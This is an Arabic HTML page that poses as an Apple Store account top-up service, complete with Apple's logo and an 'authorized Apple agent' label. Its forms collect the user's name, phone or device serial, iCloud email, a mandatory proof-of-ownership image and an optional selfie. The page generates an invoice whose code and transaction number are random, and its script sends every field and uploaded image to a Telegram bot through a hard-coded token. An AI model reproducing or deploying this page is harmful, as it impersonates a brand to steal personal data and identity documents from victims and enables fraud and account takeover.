<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن حسابات أبل ستور</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&display=swap');
        
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #f5f5f7;
            margin: 0;
            padding: 0;
            color: #1d1d1f;
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            background: #fff;
            min-height: 100vh;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0,0,0,0.05);
        }

        .header {
            text-align: center;
            padding: 20px 0;
        }

        .apple-logo {
            width: 50px;
            height: 50px;
            fill: #1d1d1f;
        }

        h2 {
            font-size: 1.2rem;
            margin-top: 10px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            font-size: 0.9rem;
        }

        input[type="text"], input[type="file"], select {
            width: 100%;
            padding: 12px;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            box-sizing: border-box;
            font-family: inherit;
            background-color: #f5f5f7;
            transition: all 0.3s;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #0071e3;
            background-color: #fff;
        }

        .btn {
            width: 100%;
            padding: 15px;
            background-color: #0071e3;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }

        .btn:hover {
            background-color: #005bb5;
        }

        .btn:disabled {
            background-color: #999;
            cursor: not-allowed;
        }

        #page2, #page3 {
            display: none;
        }

        .invoice-box {
            background: #f9f9fb;
            border: 1px dashed #0071e3;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            font-size: 0.95rem;
        }

        .invoice-box p {
            margin: 5px 0;
            border-bottom: 1px solid #eee;
            padding-bottom: 5px;
        }

        .invoice-box span {
            font-weight: 800;
            color: #0071e3;
        }
        
        .commission-note {
            font-size: 0.8rem;
            color: #e74c3c;
            margin-top: 5px;
            display: block;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <svg class="apple-logo" viewBox="0 0 170 170">
            <path d="M150.37,130.25c-2.45,5.66-5.35,10.87-8.71,15.66c-4.58,6.53-8.33,11.05-11.22,13.56c-4.48,4.12-9.28,6.23-14.42,6.23 c-1.94,0-4.39-0.53-7.34-1.6c-2.95-1.07-5.93-1.99-8.94-2.76c-3.01-0.76-5.74-1.15-8.19-1.15c-2.85,0-5.83,0.4-8.94,1.2 c-3.11,0.8-6.14,1.74-9.08,2.83c-2.95,1.09-5.23,1.63-6.85,1.63c-4.7,0-9.25-2.02-13.66-6.05c-3.8-3.3-7.85-8.08-12.14-14.34 c-7.23-10.42-12.98-21.73-17.25-33.94c-4.27-12.21-6.41-23.33-6.41-33.37c0-12.21,2.8-22.3,8.42-30.28 c5.62-7.98,13.43-11.97,23.42-11.97c3.9,0,7.9,0.91,12.01,2.72c4.1,1.81,7.21,2.72,9.31,2.72c1.7,0,5.01-1.02,9.93-3.07 c4.92-2.04,9.45-3.07,13.59-3.07c8.58,0,15.75,2.46,21.5,7.38c4.27,3.67,7.39,8.08,9.36,13.24c-8.66,4.68-12.99,11.74-12.99,21.19 c0,7.2,2.5,13.34,7.49,18.42c5,5.08,11.08,8.23,18.25,9.45C153.94,115.58,152.82,124.58,150.37,130.25z M116.73,34.02 c-0.1,2.07-0.7,4.52-1.79,7.36c-1.09,2.83-2.61,5.37-4.54,7.61c-1.94,2.24-4.32,4.04-7.14,5.42c-2.82,1.38-5.59,2.15-8.31,2.33 c-0.2-2.31,0.37-4.87,1.71-7.69c1.34-2.82,3-5.32,4.98-7.51c1.99-2.19,4.4-3.95,7.23-5.28C111.7,34.93,114.33,34.13,116.73,34.02z"/>
        </svg>
        <h2>شحن حسابات أبل ستور</h2>
    </div>

    <!-- الصفحة الأولى: الطلب -->
    <div id="page1">
        <form id="orderForm">
            <div class="form-group">
                <label>نوع الحساب (المنطقة):</label>
                <select id="accountType" required onchange="updatePrices()">
                    <option value="" disabled selected>اختر نوع الحساب</option>
                    <option value="US">الأمريكي (عمولة 0$)</option>
                    <option value="AR">العربي (عمولة 2$)</option>
                    <option value="SA">السعودي (عمولة 2$)</option>
                    <option value="IN">الهندي (عمولة 2$)</option>
                    <option value="JP">الياباني (عمولة 2$)</option>
                    <option value="CA">الكندي (عمولة 2$)</option>
                    <option value="UK">البريطاني (عمولة 2$)</option>
                    <option value="RU">الروسي (عمولة 2$)</option>
                    <option value="DE">الألماني (عمولة 2$)</option>
                </select>
            </div>

            <div class="form-group">
                <label>فئة الشحن:</label>
                <select id="cardValue" required>
                    <option value="" disabled selected>يرجى اختيار نوع الحساب أولاً</option>
                </select>
                <span id="commissionText" class="commission-note"></span>
            </div>

            <div class="form-group">
                <label>الاسم كما في الحساب:</label>
                <input type="text" id="accName" required placeholder="أدخل الاسم">
            </div>

            <div class="form-group">
                <label>رقم الهاتف أو الرقم التسلسلي:</label>
                <input type="text" id="accPhone" required placeholder="رقم الهاتف المرتبط">
            </div>

            <div class="form-group">
                <label>الحساب (الإيميل):</label>
                <input type="text" id="accEmail" required placeholder="example@icloud.com">
            </div>

            <div class="form-group">
                <label>إثبات ملكية الحساب (إجباري):</label>
                <input type="file" id="proofFile" required accept="image/*">
            </div>

            <div class="form-group">
                <label>صورة سيلفي لك (اختياري):</label>
                <input type="file" id="selfieFile" accept="image/*">
            </div>

            <button type="button" class="btn" onclick="goToPage2()">إرسال الطلب</button>
        </form>
    </div>

    <!-- الصفحة الثانية: الدفع -->
    <div id="page2">
        <h3 style="text-align: center; color: #0071e3;">متابعة الدفع</h3>
        <form id="paymentForm">
            <div class="form-group">
                <label>اختر الدولة:</label>
                <select id="countrySelect" required onchange="updatePaymentMethods()">
                    <option value="" disabled selected>اختر دولتك</option>
                    <option value="YE">اليمن</option>
                    <option value="SA">السعودية</option>
                    <option value="AE">الإمارات</option>
                    <option value="EG">مصر</option>
                    <option value="OTHER">دولة أخرى</option>
                </select>
            </div>

            <div class="form-group">
                <label>طريقة الدفع:</label>
                <select id="paymentMethod" required>
                    <option value="" disabled selected>يرجى اختيار الدولة أولاً</option>
                </select>
            </div>

            <button type="button" class="btn" onclick="generateInvoice()">إنشاء فاتورة الدفع</button>
        </form>

        <div id="invoiceSection" style="display:none;">
            <div class="invoice-box">
                <p>رمز الفاتورة: <span id="invCode"></span></p>
                <p>الاسم: <span id="invName"></span></p>
                <p>الوكيل: <span id="invAgent">وكيل أبل المعتمد</span></p>
                <p>الحساب المراد شحنه: <span id="invAcc"></span></p>
                <p>المبلغ الإجمالي للدفع: <span id="invTotal"></span></p>
                <p>رقم العملية: <span id="invTrans"></span></p>
            </div>
            <p style="font-size: 0.85rem; color: #666; text-align:center; margin-top:10px;">يرجى نسخ رمز الفاتورة وإتمام الدفع.</p>
            <button type="button" id="submitBtn" class="btn" style="background:#28a745;" onclick="finishOrder()">تأكيد الدفع وإرسال</button>
        </div>
    </div>

    <!-- الصفحة الثالثة: رسالة النجاح -->
    <div id="page3">
        <div style="text-align: center; padding: 40px 0;">
            <svg style="width: 80px; fill: #28a745; margin-bottom: 20px;" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
            <h2 style="color: #28a745;">تم إرسال طلبك بنجاح!</h2>
            <p style="color: #666;">يرجى الانتظار، سيتم معالجة طلبك قريباً وشحن الحساب.</p>
            <button type="button" class="btn" onclick="location.reload()" style="margin-top: 30px;">طلب جديد</button>
        </div>
    </div>

</div>

<script>
    // إعدادات بوت التليجرام
    const BOT_TOKEN = '8999556963:AAG9v3lw-nGpplQYRA-6iJG4bOzdCpq5YIA';
    const CHAT_ID = '8999556963';

    let commission = 0;
    let totalAmount = 0;

    function updatePrices() {
        const type = document.getElementById('accountType').value;
        const cardValue = document.getElementById('cardValue');
        const commText = document.getElementById('commissionText');
        
        cardValue.innerHTML = '<option value="" disabled selected>اختر الفئة</option>';
        
        commission = (type === 'US') ? 0 : 2;
        commText.innerText = `عمولة الشراء لهذه المنطقة: ${commission}$`;

        const values = (type === 'US') ? [2, 5, 10, 20, 50, 100] : [5, 10, 20, 50, 100];

        values.forEach(val => {
            let opt = document.createElement('option');
            opt.value = val;
            opt.innerHTML = `${val}$`;
            cardValue.appendChild(opt);
        });
    }

    function goToPage2() {
        const name = document.getElementById('accName').value;
        const email = document.getElementById('accEmail').value;
        const val = document.getElementById('cardValue').value;
        const proofFile = document.getElementById('proofFile').files.length;

        if(!name || !email || !val || proofFile === 0) {
            alert('يرجى تعبئة الحقول الإلزامية وإرفاق صورة إثبات الملكية!');
            return;
        }

        totalAmount = parseInt(val) + commission;

        document.getElementById('page1').style.display = 'none';
        document.getElementById('page2').style.display = 'block';
    }

    function updatePaymentMethods() {
        const country = document.getElementById('countrySelect').value;
        const paymentMethod = document.getElementById('paymentMethod');
        
        paymentMethod.innerHTML = '<option value="" disabled selected>اختر طريقة الدفع</option>';

        if(country === 'YE') {
            paymentMethod.innerHTML += '<option value="agent">وكيل معتمد فقط (الكريمي/النجم/صرافة)</option>';
        } else if (country === 'SA') {
            paymentMethod.innerHTML += '<option value="mada">مدى (Mada)</option>';
            paymentMethod.innerHTML += '<option value="stc">STC Pay</option>';
        } else {
            paymentMethod.innerHTML += '<option value="visa">فيزا / ماستركارد</option>';
            paymentMethod.innerHTML += '<option value="paypal">باي بال (PayPal)</option>';
        }
    }

    function generateInvoice() {
        const country = document.getElementById('countrySelect').value;
        const method = document.getElementById('paymentMethod').value;

        if(!country || !method) {
            alert('يرجى تحديد الدولة وطريقة الدفع!');
            return;
        }

        const randomCode = 'APP-' + Math.floor(100000 + Math.random() * 900000);
        const randomTrans = Math.floor(100000000 + Math.random() * 900000000);
        const name = document.getElementById('accName').value;
        const email = document.getElementById('accEmail').value;

        document.getElementById('invCode').innerText = randomCode;
        document.getElementById('invName').innerText = name;
        document.getElementById('invAcc').innerText = email;
        document.getElementById('invTotal').innerText = totalAmount + '$';
        document.getElementById('invTrans').innerText = randomTrans;

        document.getElementById('invoiceSection').style.display = 'block';
    }

    async function finishOrder() {
        const btn = document.getElementById('submitBtn');
        btn.innerText = 'جاري إرسال الطلب والمرفقات...';
        btn.disabled = true;

        // تجميع البيانات
        const accTypeSelect = document.getElementById('accountType');
        const accTypeName = accTypeSelect.options[accTypeSelect.selectedIndex].text;
        const cardVal = document.getElementById('cardValue').value;
        const accName = document.getElementById('accName').value;
        const accPhone = document.getElementById('accPhone').value;
        const accEmail = document.getElementById('accEmail').value;
        const countrySelect = document.getElementById('countrySelect');
        const countryName = countrySelect.options[countrySelect.selectedIndex].text;
        const paySelect = document.getElementById('paymentMethod');
        const payName = paySelect.options[paySelect.selectedIndex].text;
        const invCode = document.getElementById('invCode').innerText;
        const invTrans = document.getElementById('invTrans').innerText;

        // تجهيز نص الرسالة لتليجرام
        const messageText = `
📦 *طلب شحن جديد*
ــــــــــــــــــــــــــــــــــــــــ
🌐 *المنطقة:* ${accTypeName}
💳 *الفئة:* ${cardVal}$
💰 *الإجمالي (مع العمولة):* ${totalAmount}$
👤 *الاسم:* ${accName}
📱 *الهاتف/السيريال:* ${accPhone}
📧 *الحساب:* ${accEmail}
🌍 *الدولة:* ${countryName}
🏦 *طريقة الدفع:* ${payName}
🧾 *رقم الفاتورة:* ${invCode}
🔄 *رقم العملية:* ${invTrans}
`;

        try {
            // 1. إرسال البيانات النصية
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: messageText,
                    parse_mode: 'Markdown'
                })
            });

            // 2. إرسال إثبات الملكية (صورة/مستند)
            const proofFile = document.getElementById('proofFile').files[0];
            if (proofFile) {
                const formDataProof = new FormData();
                formDataProof.append('chat_id', CHAT_ID);
                formDataProof.append('document', proofFile);
                formDataProof.append('caption', `مرفق إثبات الملكية للفاتورة: ${invCode}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formDataProof
                });
            }

            // 3. إرسال السيلفي إن وجد
            const selfieFile = document.getElementById('selfieFile').files[0];
            if (selfieFile) {
                const formDataSelfie = new FormData();
                formDataSelfie.append('chat_id', CHAT_ID);
                formDataSelfie.append('document', selfieFile);
                formDataSelfie.append('caption', `صورة السيلفي للفاتورة: ${invCode}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formDataSelfie
                });
            }

            // الانتقال لصفحة النجاح
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'block';

        } catch (error) {
            console.error('Error:', error);
            alert('حدث خطأ أثناء الاتصال بالخادم، يرجى المحاولة مرة أخرى.');
            btn.innerText = 'تأكيد الدفع وإرسال';
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
